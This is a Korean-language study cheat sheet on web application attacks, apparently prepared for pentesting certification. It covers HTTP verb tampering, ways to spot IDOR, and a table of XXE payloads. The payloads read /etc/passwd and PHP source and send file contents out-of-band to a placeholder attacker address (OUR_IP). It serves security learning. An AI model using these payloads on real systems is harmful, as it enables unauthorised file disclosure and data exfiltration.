# 웹 애플리케이션 공격

## 웹 애플리케이션 공격



> 내 [Burp Suite Certified Practitioner 학습 자료는](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/README.md) 여기에 나열된 동일한 주제 중 일부를 더 자세히 다루고 있습니다.\
> [HackTheBox Academy 웹 공격](https://academy.hackthebox.com/module/134/section/1158)

### HTTP 동사 변조



> HTTP에는 웹 서버에서 HTTP 메서드로 허용할 수 있는 9개의 [동사가 있습니다.](https://academy.hackthebox.com/module/134/section/1159)\
> [HTTP 요청 방법 Mozilla 참조](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods)

`HTTP Method`

* `GET`
* `HEAD`
* `POST`
* `PUT`
* `DELETE`
* `CONNECT`
* `OPTIONS`
* `PATCH`
* `TRACE`

| **명령**       | **설명**                 |
| ------------ | ---------------------- |
| `-X OPTIONS` | Curl을 사용하여 HTTP 메서드 설정 |

### IDOR



`Identify IDORS`

* \~ 안에`URL parameters & APIs`
* \~ 안에`AJAX Calls`
* 에 의해`understanding reference hashing/encoding`
* 에 의해`comparing user roles`

| **명령**   | **설명**               |
| -------- | -------------------- |
| `md5sum` | MD5는 문자열을 해시합니다.     |
| `base64` | Base64로 문자열을 인코딩합니다. |

### XXE



| **암호**                                                                             | **설명**                           |
| ---------------------------------------------------------------------------------- | -------------------------------- |
| `<!ENTITY xxe SYSTEM "http://localhost/email.dtd">`                                | URL에 외부 엔터티 정의                   |
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">`                                        | 파일 경로에 외부 엔터티 정의                 |
| `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` | base64 인코딩 필터를 사용하여 PHP 소스 코드 읽기 |
| `<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">`        | PHP 오류를 통해 파일 읽기                 |
| `<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">`  | 파일 OOB 유출 읽기                     |
